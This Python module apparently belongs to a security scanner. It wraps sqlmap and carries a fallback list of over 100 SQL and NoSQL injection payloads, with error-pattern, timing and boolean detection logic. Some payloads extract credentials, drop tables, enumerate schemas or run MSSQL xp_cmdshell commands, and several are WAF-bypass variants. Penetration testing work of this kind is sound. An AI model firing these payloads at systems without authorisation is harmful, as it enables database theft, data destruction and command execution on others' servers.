"""SQLMap Wrapper — automated SQL injection detection and exploitation.

Runs sqlmap via subprocess with --batch --forms --level 3 --risk 2.
Falls back to 30+ real SQLi payloads if sqlmap binary is not installed.
"""

import json
import time
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

from .base import BaseTool, ToolResult
from ..core.logger import logger
from ..core.ratelimit import get_limiter
from ..core.transport import ssl_verify


# ──────────────────────────────────────────────────────────────────────
# SQL Injection Payloads — 30+ real payloads covering all major vectors
# ──────────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    # ── Error-based (classic) ──
    {"payload": "'", "technique": "error-based", "description": "Single quote to trigger syntax error"},
    {"payload": "\"", "technique": "error-based", "description": "Double quote syntax error"},
    {"payload": "')", "technique": "error-based", "description": "Close parenthesis and quote"},
    {"payload": "\")", "technique": "error-based", "description": "Double quote close parenthesis"},
    {"payload": "' OR '1'='1", "technique": "error-based", "description": "Classic OR tautology"},
    {"payload": "' OR '1'='1' --", "technique": "error-based", "description": "OR tautology with comment"},
    {"payload": "' OR '1'='1' /*", "technique": "error-based", "description": "OR tautology with block comment"},
    {"payload": "\" OR \"1\"=\"1", "technique": "error-based", "description": "Double quote OR tautology"},
    {"payload": "\" OR \"1\"=\"1\" --", "technique": "error-based", "description": "Double quote tautology with comment"},
    {"payload": "1 OR 1=1", "technique": "error-based", "description": "Numeric OR tautology"},
    {"payload": "1' OR 1=1 --", "technique": "error-based", "description": "Numeric OR with comment"},
    {"payload": "admin'--", "technique": "error-based", "description": "Admin bypass with comment"},
    {"payload": "admin' #", "technique": "error-based", "description": "Admin bypass with hash comment"},
    {"payload": "' OR ''='", "technique": "error-based", "description": "Empty string tautology"},

    # ── UNION-based ──
    {"payload": "' UNION SELECT NULL--", "technique": "union-based", "description": "UNION SELECT with NULL columns"},
    {"payload": "' UNION SELECT NULL,NULL--", "technique": "union-based", "description": "UNION with 2 NULL columns"},
    {"payload": "' UNION SELECT NULL,NULL,NULL--", "technique": "union-based", "description": "UNION with 3 NULL columns"},
    {"payload": "' UNION SELECT 1,2,3--", "technique": "union-based", "description": "UNION with numeric columns"},
    {"payload": "' UNION ALL SELECT NULL--", "technique": "union-based", "description": "UNION ALL SELECT"},
    {"payload": "' UNION SELECT username,password FROM users--", "technique": "union-based", "description": "UNION to extract user data"},

    # ── Time-based blind ──
    {"payload": "' AND SLEEP(3)--", "technique": "time-based", "description": "MySQL SLEEP delay"},
    {"payload": "1' AND SLEEP(3)--", "technique": "time-based", "description": "Numeric SLEEP delay"},
    {"payload": "' AND SLEEP(3) AND '1'='1", "technique": "time-based", "description": "SLEEP with tautology"},
    {"payload": "'; WAITFOR DELAY '0:0:3'--", "technique": "time-based", "description": "MSSQL WAITFOR delay"},
    {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "technique": "time-based", "description": "Subquery SLEEP"},
    {"payload": "'; SELECT pg_sleep(3)--", "technique": "time-based", "description": "PostgreSQL pg_sleep delay"},
    {"payload": "' OR BENCHMARK(10000000,SHA1('test'))--", "technique": "time-based", "description": "MySQL BENCHMARK delay"},

    # ── Boolean-based blind ──
    {"payload": "' AND 1=1--", "technique": "boolean-based", "description": "True condition boolean test"},
    {"payload": "' AND 1=2--", "technique": "boolean-based", "description": "False condition boolean test"},
    {"payload": "' AND 'a'='a", "technique": "boolean-based", "description": "String tautology boolean test"},
    {"payload": "' AND 'a'='b", "technique": "boolean-based", "description": "String contradiction boolean test"},
    {"payload": "1 AND 1=1", "technique": "boolean-based", "description": "Numeric boolean true"},
    {"payload": "1 AND 1=2", "technique": "boolean-based", "description": "Numeric boolean false"},

    # ── Stacked queries ──
    {"payload": "'; DROP TABLE test--", "technique": "stacked", "description": "Stacked DROP query (harmless test)"},
    {"payload": "'; SELECT 1--", "technique": "stacked", "description": "Stacked SELECT query"},

    # ── WAF bypass / advanced ──
    {"payload": "' /*!UNION*/ /*!SELECT*/ NULL--", "technique": "waf-bypass", "description": "MySQL version comment bypass"},
    {"payload": "' %55NION %53ELECT NULL--", "technique": "waf-bypass", "description": "URL encoding bypass"},
    {"payload": "' uni/**/on sel/**/ect NULL--", "technique": "waf-bypass", "description": "Inline comment bypass"},
    {"payload": "' UNION%0ASELECT%0ANULL--", "technique": "waf-bypass", "description": "Newline bypass"},
    {"payload": "' OR 1=1 LIMIT 1--", "technique": "waf-bypass", "description": "LIMIT clause injection"},

    # ── More Error-based (DBMS-specific) ──
    {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "technique": "error-based", "description": "MySQL EXTRACTVALUE error-based"},
    {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--", "technique": "error-based", "description": "MySQL UPDATEXML error-based"},
    {"payload": "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "technique": "error-based", "description": "MySQL floor+rand error-based"},
    {"payload": "' AND EXP(~(SELECT * FROM(SELECT version())a))--", "technique": "error-based", "description": "MySQL EXP overflow error-based"},
    {"payload": "' AND 1=CAST((SELECT version()) AS int)--", "technique": "error-based", "description": "PostgreSQL CAST error-based"},
    {"payload": "' AND 1=CAST((SELECT current_database()) AS int)--", "technique": "error-based", "description": "PostgreSQL database name via CAST"},
    {"payload": "' AND 1=CONVERT(int,@@version)--", "technique": "error-based", "description": "MSSQL CONVERT error-based"},
    {"payload": "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "technique": "error-based", "description": "MSSQL table enumeration via CONVERT"},
    {"payload": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--", "technique": "error-based", "description": "Oracle CTXSYS error-based"},
    {"payload": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE ROWNUM=1))--", "technique": "error-based", "description": "Oracle table enumeration"},

    # ── More Time-based ──
    {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "technique": "time-based", "description": "MySQL subquery SLEEP"},
    {"payload": "' OR (SELECT * FROM (SELECT(SLEEP(3)))a)--", "technique": "time-based", "description": "MySQL OR subquery SLEEP"},
    {"payload": "' AND SLEEP(3) AND '1'='1", "technique": "time-based", "description": "MySQL SLEEP with tautology"},
    {"payload": "' OR SLEEP(3)--", "technique": "time-based", "description": "MySQL OR SLEEP"},
    {"payload": "1 AND SLEEP(3)--", "technique": "time-based", "description": "Numeric SLEEP"},
    {"payload": "' AND pg_sleep(3)--", "technique": "time-based", "description": "PostgreSQL pg_sleep"},
    {"payload": "' OR pg_sleep(3)--", "technique": "time-based", "description": "PostgreSQL OR pg_sleep"},
    {"payload": "'; SELECT pg_sleep(3)--", "technique": "time-based", "description": "PostgreSQL stacked pg_sleep"},
    {"payload": "' IF 1=1 WAITFOR DELAY '0:0:3'--", "technique": "time-based", "description": "MSSQL conditional WAITFOR"},
    {"payload": "' IF 1=2 WAITFOR DELAY '0:0:3'--", "technique": "time-based", "description": "MSSQL false WAITFOR"},
    {"payload": "'; WAITFOR DELAY '0:0:3'--", "technique": "time-based", "description": "MSSQL stacked WAITFOR"},
    {"payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", "technique": "time-based", "description": "Oracle DBMS_PIPE delay"},
    {"payload": "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", "technique": "time-based", "description": "Oracle OR DBMS_PIPE delay"},
    {"payload": "' AND (SELECT COUNT(*) FROM ALL_USERS t1,ALL_USERS t2,ALL_USERS t3,ALL_USERS t4,ALL_USERS t5)>0 AND '1'='1", "technique": "time-based", "description": "Oracle heavy query delay"},

    # ── More Boolean-based ──
    {"payload": "' OR '1'='1", "technique": "boolean-based", "description": "OR tautology"},
    {"payload": "' OR '1'='2", "technique": "boolean-based", "description": "OR contradiction"},
    {"payload": "' AND '1'='1", "technique": "boolean-based", "description": "AND tautology"},
    {"payload": "' AND '1'='2", "technique": "boolean-based", "description": "AND contradiction"},
    {"payload": "' OR 1=1--", "technique": "boolean-based", "description": "Numeric OR true"},
    {"payload": "' OR 1=2--", "technique": "boolean-based", "description": "Numeric OR false"},
    {"payload": "' OR 'a'='a'--", "technique": "boolean-based", "description": "String OR true"},
    {"payload": "' OR 'a'='b'--", "technique": "boolean-based", "description": "String OR false"},
    {"payload": "') AND ('1'='1", "technique": "boolean-based", "description": "Parenthesis AND true"},
    {"payload": "') AND ('1'='2", "technique": "boolean-based", "description": "Parenthesis AND false"},
    {"payload": "' OR 1=1#", "technique": "boolean-based", "description": "OR true with hash"},
    {"payload": "' OR 1=2#", "technique": "boolean-based", "description": "OR false with hash"},

    # ── More UNION-based ──
    {"payload": "' UNION SELECT 1,@@version,3--", "technique": "union-based", "description": "UNION extract MySQL version"},
    {"payload": "' UNION SELECT 1,@@version,3,4--", "technique": "union-based", "description": "UNION extract version 4 cols"},
    {"payload": "' UNION SELECT 1,@@version,3,4,5--", "technique": "union-based", "description": "UNION extract version 5 cols"},
    {"payload": "' UNION SELECT table_name FROM information_schema.tables--", "technique": "union-based", "description": "UNION extract table names"},
    {"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "technique": "union-based", "description": "UNION extract column names"},
    {"payload": "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--", "technique": "union-based", "description": "MySQL group_concat tables"},
    {"payload": "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--", "technique": "union-based", "description": "MySQL group_concat columns"},
    {"payload": "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--", "technique": "union-based", "description": "MySQL extract credentials"},
    {"payload": "' UNION SELECT 1,version(),3--", "technique": "union-based", "description": "PostgreSQL version extraction"},
    {"payload": "' UNION SELECT tablename FROM pg_tables--", "technique": "union-based", "description": "PostgreSQL table enumeration"},
    {"payload": "' UNION SELECT 1,banner,3 FROM v$version--", "technique": "union-based", "description": "Oracle version extraction"},
    {"payload": "' UNION SELECT table_name FROM all_tables--", "technique": "union-based", "description": "Oracle table enumeration"},
    {"payload": "' UNION SELECT 1,sql,3 FROM sqlite_master--", "technique": "union-based", "description": "SQLite schema extraction"},

    # ── More Stacked queries ──
    {"payload": "'; SELECT @@version--", "technique": "stacked", "description": "MySQL stacked version"},
    {"payload": "'; SELECT version()--", "technique": "stacked", "description": "PostgreSQL stacked version"},
    {"payload": "'; EXEC xp_cmdshell('whoami')--", "technique": "stacked", "description": "MSSQL command execution"},
    {"payload": "'; CREATE TABLE test(id int)--", "technique": "stacked", "description": "Stacked CREATE TABLE"},
    {"payload": "'; INSERT INTO test VALUES(1)--", "technique": "stacked", "description": "Stacked INSERT"},

    # ── More WAF bypass ──
    {"payload": "' /*!50000UNION*//*!50000SELECT*/ NULL--", "technique": "waf-bypass", "description": "MySQL version comment bypass"},
    {"payload": "' /*!UNION*/ /*!SELECT*/ NULL--", "technique": "waf-bypass", "description": "MySQL comment bypass"},
    {"payload": "' UNION/**/SELECT/**/NULL--", "technique": "waf-bypass", "description": "Inline comment bypass"},
    {"payload": "' uNiOn SeLeCt NULL--", "technique": "waf-bypass", "description": "Case variation bypass"},
    {"payload": "' UNION%0ASELECT%0ANULL--", "technique": "waf-bypass", "description": "Newline bypass"},
    {"payload": "' UNION%0DSELECT%0DNULL--", "technique": "waf-bypass", "description": "Carriage return bypass"},
    {"payload": "' UNION%09SELECT%09NULL--", "technique": "waf-bypass", "description": "Tab bypass"},
    {"payload": "' UNION%0BSELECT%0BNULL--", "technique": "waf-bypass", "description": "Vertical tab bypass"},
    {"payload": "' UNION%0CSELECT%0CNULL--", "technique": "waf-bypass", "description": "Form feed bypass"},
    {"payload": "' %55NION %53ELECT NULL--", "technique": "waf-bypass", "description": "URL encoding bypass"},
    {"payload": "' un%69on sel%65ct NULL--", "technique": "waf-bypass", "description": "Partial URL encoding"},
    {"payload": "' uni/**/on sel/**/ect NULL--", "technique": "waf-bypass", "description": "Comment injection bypass"},
    {"payload": "' /*!12345UNION*/ /*!12345SELECT*/ NULL--", "technique": "waf-bypass", "description": "Version comment bypass"},
    {"payload": "-1 union select NULL--", "technique": "waf-bypass", "description": "Negative number prefix"},
    {"payload": "0 union select NULL--", "technique": "waf-bypass", "description": "Zero prefix"},
    {"payload": "null union select NULL--", "technique": "waf-bypass", "description": "NULL prefix"},
    {"payload": "' and 1=0 union select NULL--", "technique": "waf-bypass", "description": "False condition prefix"},

    # ── JSON/XML context ──
    {"payload": "{\"id\": \"1 OR 1=1--\"}", "technique": "json", "description": "JSON OR injection"},
    {"payload": "{\"id\": \"1 UNION SELECT 1,2,3--\"}", "technique": "json", "description": "JSON UNION injection"},
    {"payload": "{\"id\": {\"$gt\": \"\"}}", "technique": "json", "description": "NoSQL $gt injection"},
    {"payload": "{\"id\": {\"$ne\": \"\"}}", "technique": "json", "description": "NoSQL $ne injection"},
    {"payload": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}", "technique": "json", "description": "NoSQL auth bypass"},

    # ── Header injection ──
    {"payload": "' OR 1=1--", "technique": "header", "description": "Header SQL injection", "inject_in": "header"},
    {"payload": "X-Forwarded-For: ' OR 1=1--", "technique": "header", "description": "XFF SQL injection", "inject_in": "X-Forwarded-For"},
    {"payload": "Referer: ' OR 1=1--", "technique": "header", "description": "Referer SQL injection", "inject_in": "Referer"},
    {"payload": "User-Agent: ' OR 1=1--", "technique": "header", "description": "User-Agent SQL injection", "inject_in": "User-Agent"},

    # ── Polyglot ──
    {"payload": "'-sleep(3)-'", "technique": "polyglot", "description": "MySQL polyglot sleep"},
    {"payload": "' or sleep(3) or '", "technique": "polyglot", "description": "OR sleep polyglot"},
    {"payload": "' or pg_sleep(3) or '", "technique": "polyglot", "description": "PostgreSQL polyglot"},
    {"payload": "';select sleep(3);'", "technique": "polyglot", "description": "Stacked sleep polyglot"},
    {"payload": "' and 1=0 union select @@version--", "technique": "polyglot", "description": "Version extraction polyglot"},
    {"payload": "admin' or '1'='1", "technique": "polyglot", "description": "Admin bypass polyglot"},
    {"payload": "admin' or '1'='1'--", "technique": "polyglot", "description": "Admin bypass with comment"},
    {"payload": "admin'/**/or/**/1=1", "technique": "polyglot", "description": "Admin bypass with comments"},
]

# SQL error patterns for detecting injection responses
SQL_ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark after the character string",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"mysql_query",
    r"valid mysql result",
    r"mysqld",
    r"sql syntax.*mysql",
    r"mysql.*error",
    # PostgreSQL
    r"postgresql.*error",
    r"warning.*pg_",
    r"valid postgresql result",
    r"pg_query",
    r"pg_exec",
    r"psql.*error",
    r"org\.postgresql\.util\.psqlexception",
    # MSSQL / SQL Server
    r"microsoft.*odbc.*sql server",
    r"microsoft sql native client error",
    r"unclosed quotation mark",
    r"microsoft ole db",
    r"odbc sql server driver",
    r"\[sql server\]",
    r"mssql",
    r"system\.data\.sqlclient\.sqlexception",
    # Oracle
    r"ora-\d{5}",
    r"oracle.*error",
    r"warning.*oci",
    r"warning.*ora_",
    r"quoted string not properly terminated",
    # SQLite
    r"sqlite3.*error",
    r"sqlite.*error",
    r"sqlite3\.operationalerror",
    r"sql logic error",
    # Generic / Access / ODBC
    r"microsoft access",
    r"jet database engine",
    r"access.*database",
    r"odbc.*driver",
    r"jdbc.*error",
    r"sqlstate",
    r"sql.*exception",
    r"syntax error.*in query",
    r"incomplete query",
    r"unexpected end of sql command",
    r"invalid query",
    r"sql command not properly ended",
    r"division by zero",
    r"supplied argument is not valid",
    r"unterminated quoted string",
    r"mysqlclient",
]


class SQLInjectionScanner(BaseTool):
    """Wrapper around sqlmap for SQL injection testing."""

    name = "sqlmap"
    binary = "sqlmap"
    description = "Automated SQL injection detection and exploitation"

    def scan(self, target: str, **kwargs) -> ToolResult:
        """Test a URL for SQL injection vulnerabilities."""
        if not self.installed:
            logger.info(f"[{self.name}] Binary not found, using Python fallback")
            return self._fallback_scan(target, **kwargs)

        cmd = [
            "sqlmap",
            "-u", target,
            "--batch",
            "--forms",
            "--level=3",
            "--risk=2",
            "--random-agent",
            "--output-dir=/tmp/sqlmap_output",
            "--timeout=10",
            "--retries=2",
        ]

        if kwargs.get("dbms"):
            cmd.extend([f"--dbms={kwargs['dbms']}"])
        if kwargs.get("threads"):
            cmd.extend([f"--threads={kwargs['threads']}"])
        if kwargs.get("tamper"):
            cmd.extend([f"--tamper={kwargs['tamper']}"])
        if kwargs.get("cookie"):
            cmd.extend([f"--cookie={kwargs['cookie']}"])
        if kwargs.get("data"):
            cmd.extend([f"--data={kwargs['data']}"])
        if kwargs.get("method"):
            cmd.extend([f"--method={kwargs['method']}"])

        start = time.time()
        result = self._run_cmd(cmd, timeout=kwargs.get("timeout", 600))
        duration = time.time() - start

        findings = []
        stdout = result.stdout or ""

        # Parse injection parameters
        injection_blocks = re.findall(
            r"Parameter:\s+(.+?)\s+\((.+?)\)\s*\n((?:\s+Type:.*\n)+)",
            stdout,
            re.MULTILINE,
        )

        for param, method, types_block in injection_blocks:
            types = re.findall(r"Type:\s+(.+?)(?:\n|$)", types_block)
            for inj_type in types:
                findings.append({
                    "title": "SQL Injection",
                    "severity": "CRITICAL",
                    "description": f"SQL injection found in parameter '{param.strip()}' via {method.strip()} method. Injection type: {inj_type.strip()}",
                    "evidence": f"Parameter: {param.strip()}, Type: {inj_type.strip()}",
                    "url": target,
                    "parameter": param.strip(),
                    "injection_type": inj_type.strip(),
                    "method": method.strip(),
                    "cvss": 9.8,
                    "remediation": "Use parameterized queries (prepared statements). Never concatenate user input into SQL strings. Implement input validation and WAF rules.",
                })

        # Check for database enumeration results
        db_names = re.findall(r"\[\*\]\s+(\w+)", stdout)
        if db_names:
            findings.append({
                "title": "Database Enumeration Successful",
                "severity": "CRITICAL",
                "description": f"sqlmap successfully enumerated databases: {', '.join(db_names)}",
                "evidence": f"Databases: {', '.join(db_names)}",
                "url": target,
                "databases": db_names,
                "remediation": "Immediately fix the SQL injection vulnerability. Rotate database credentials.",
            })

        return ToolResult(
            tool=self.name,
            target=target,
            success=result.returncode == 0,
            findings=findings,
            raw_output=stdout,
            error=result.stderr if result.returncode != 0 else "",
            duration=duration,
        )

    def _fallback_scan(self, target: str, **kwargs) -> ToolResult:
        """Basic SQLi detection using Python httpx with 30+ real payloads."""
        try:
            import httpx
        except ImportError:
            return ToolResult(
                tool=f"{self.name}(fallback)",
                target=target,
                success=False,
                error="httpx not installed. Run: pip install httpx",
            )

        findings: List[Dict[str, Any]] = []
        start = time.time()
        limiter = get_limiter(rps=5.0)

        parsed = urlparse(target)
        host = parsed.hostname or target

        # Suppress SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        client = httpx.Client(
            follow_redirects=True,
            timeout=12,
            verify=ssl_verify(),
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
        )

        # Get baseline response
        try:
            baseline_resp = client.get(target)
            baseline_body = baseline_resp.text
            baseline_len = len(baseline_body)
            baseline_status = baseline_resp.status_code
        except Exception as e:
            client.close()
            return ToolResult(
                tool=f"{self.name}(fallback)",
                target=target,
                success=False,
                error=f"Failed to connect to target: {e}",
                duration=time.time() - start,
            )

        # Parse URL parameters
        params = parse_qs(parsed.query, keep_blank_values=True)

        # If no parameters, try common parameter names
        if not params:
            params = {"id": ["1"]}

        # Track seen findings to deduplicate
        seen: set = set()
        compiled_errors = [re.compile(p, re.IGNORECASE) for p in SQL_ERROR_PATTERNS]

        for param_name, param_values in params.items():
            original_value = param_values[0] if param_values else "1"

            for entry in SQLI_PAYLOADS:
                payload = entry["payload"]
                technique = entry["technique"]
                desc = entry["description"]

                limiter.wait(host)

                # Build test URL
                test_params = {k: v[0] if v else "" for k, v in params.items()}
                test_params[param_name] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                try:
                    req_start = time.time()
                    resp = client.get(test_url)
                    elapsed = time.time() - req_start
                    body = resp.text
                    body_lower = body.lower()

                    # ── Error-based detection ──
                    for pattern in compiled_errors:
                        match = pattern.search(body)
                        if match:
                            dedup_key = (param_name, technique, match.group(0)[:50])
                            if dedup_key not in seen:
                                seen.add(dedup_key)
                                findings.append({
                                    "title": f"SQL Injection ({technique})",
                                    "severity": "CRITICAL",
                                    "description": f"{desc}. SQL error detected in response.",
                                    "evidence": f"Payload: {payload}, Error: {match.group(0)[:100]}",
                                    "url": target,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "technique": technique,
                                    "cvss": 9.8,
                                    "remediation": "Use parameterized queries (prepared statements). Never concatenate user input into SQL. Implement input validation.",
                                })
                            break  # One error per payload is enough

                    # ── Time-based detection ──
                    if technique == "time-based" and elapsed > 2.5:
                        dedup_key = (param_name, "time-based", payload[:20])
                        if dedup_key not in seen:
                            seen.add(dedup_key)
                            findings.append({
                                "title": "SQL Injection (Time-based Blind)",
                                "severity": "CRITICAL",
                                "description": f"{desc}. Response delayed by {elapsed:.1f}s indicating time-based blind SQLi.",
                                "evidence": f"Payload: {payload}, Response time: {elapsed:.1f}s (baseline: normal)",
                                "url": target,
                                "parameter": param_name,
                                "payload": payload,
                                "technique": "time-based",
                                "cvss": 9.8,
                                "remediation": "Use parameterized queries. Implement query timeout limits.",
                            })

                    # ── Boolean-based detection ──
                    if technique == "boolean-based":
                        content_diff = abs(len(body) - baseline_len)
                        status_changed = resp.status_code != baseline_status

                        # Significant content length change or status change
                        if (content_diff > 100 and len(body) > 0) or status_changed:
                            dedup_key = (param_name, "boolean-based", "diff")
                            if dedup_key not in seen:
                                seen.add(dedup_key)
                                findings.append({
                                    "title": "SQL Injection (Boolean-based Blind)",
                                    "severity": "CRITICAL",
                                    "description": f"{desc}. Response differs significantly from baseline (length diff: {content_diff} chars).",
                                    "evidence": f"Payload: {payload}, Baseline length: {baseline_len}, Response length: {len(body)}",
                                    "url": target,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "technique": "boolean-based",
                                    "cvss": 9.8,
                                    "remediation": "Use parameterized queries. Validate and sanitize all user inputs.",
                                })

                except (httpx.TimeoutException, httpx.ConnectError):
                    # Timeout on time-based payloads is itself a signal
                    if technique == "time-based":
                        dedup_key = (param_name, "time-based-timeout", payload[:20])
                        if dedup_key not in seen:
                            seen.add(dedup_key)
                            findings.append({
                                "title": "SQL Injection (Time-based — Timeout)",
                                "severity": "HIGH",
                                "description": f"{desc}. Request timed out, possibly due to time-based injection.",
                                "evidence": f"Payload: {payload}, Connection timed out",
                                "url": target,
                                "parameter": param_name,
                                "payload": payload,
                                "technique": "time-based",
                                "remediation": "Use parameterized queries. Implement query timeout limits.",
                            })
                    continue
                except Exception as e:
                    logger.debug(f"[{self.name}] Request error for {param_name}={payload}: {e}")
                    continue

        client.close()
        duration = time.time() - start

        return ToolResult(
            tool=f"{self.name}(fallback)",
            target=target,
            success=True,
            findings=findings,
            duration=duration,
        )
